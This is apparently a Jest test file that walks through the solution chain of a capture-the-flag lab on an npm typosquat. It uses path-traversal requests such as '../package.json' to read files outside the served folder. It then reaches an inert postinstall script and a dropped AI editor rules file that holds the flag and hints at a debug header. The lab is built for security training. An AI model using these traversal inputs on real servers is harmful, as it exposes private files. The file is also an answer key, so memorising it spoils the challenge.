import { apiRequest } from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface FileResponse {
  filename?: string;
  content?: string;
  error?: string;
}

interface VerifyResponse {
  valid: boolean;
  slug?: string;
}

describe("npm Supply Chain Typosquat — chained discovery via path traversal", () => {
  describe("HTML breadcrumb on /admin/documents leaks the dependency name", () => {
    it("page source contains the dev TODO comment naming react-toastfy", async () => {
      const { status, data } = await apiRequest<string>("/admin/documents");

      expect(status).toBe(200);
      expect(typeof data).toBe("string");
      expect(data as string).toContain("react-toastfy");
      expect(data as string).toContain("@lucas");
    });
  });

  describe("Path-traversal recon to the typosquatted package", () => {
    it("can read root package.json", async () => {
      const { status, data } = await apiRequest<FileResponse>(
        "/api/files?file=../package.json"
      );

      expect(status).toBe(200);
      expect(data).toHaveProperty("content");
      expect((data as FileResponse).content).toContain('"name"');
    });

    it("packages/react-toastfy/package.json declares a postinstall script", async () => {
      const { status, data } = await apiRequest<FileResponse>(
        "/api/files?file=../packages/react-toastfy/package.json"
      );

      expect(status).toBe(200);
      const content = (data as FileResponse).content ?? "";
      expect(content).toContain('"name": "react-toastfy"');
      expect(content).toContain("postinstall");
    });

    it("packages/react-toastfy/scripts/postinstall.js points to the dropped artifact", async () => {
      const { status, data } = await apiRequest<FileResponse>(
        "/api/files?file=../packages/react-toastfy/scripts/postinstall.js"
      );

      expect(status).toBe(200);
      const content = (data as FileResponse).content ?? "";
      expect(content).toContain("lab/quarantine/productivity-helper.mdc");
      expect(content).toContain("INERT");
    });
  });

  describe("Reading the dropped AI rules file reveals the flag", () => {
    it("lab/quarantine/productivity-helper.mdc contains flag #1 in an HTML comment", async () => {
      const { status, data } = await apiRequest<FileResponse>(
        "/api/files?file=../lab/quarantine/productivity-helper.mdc"
      );

      expect(status).toBe(200);
      const content = (data as FileResponse).content ?? "";
      expect(content).toContain(FLAGS.NPM_SUPPLY_CHAIN_TYPOSQUAT);
      expect(content).toContain("X-Debug-Auth");
      expect(content).toContain("/api/admin/diag");
      expect(content).toMatch(/<!--[\s\S]*OSS\{[^}]+\}[\s\S]*-->/);
    });
  });

  describe("Flag verification", () => {
    it("flag #1 verifies successfully", async () => {
      const { status, data } = await apiRequest<VerifyResponse>(
        "/api/flags/verify",
        {
          method: "POST",
          body: JSON.stringify({ flag: FLAGS.NPM_SUPPLY_CHAIN_TYPOSQUAT }),
        }
      );

      expect(status).toBe(200);
      expect((data as VerifyResponse).valid).toBe(true);
      expect((data as VerifyResponse).slug).toBe("npm-supply-chain-typosquat");
    });
  });
});
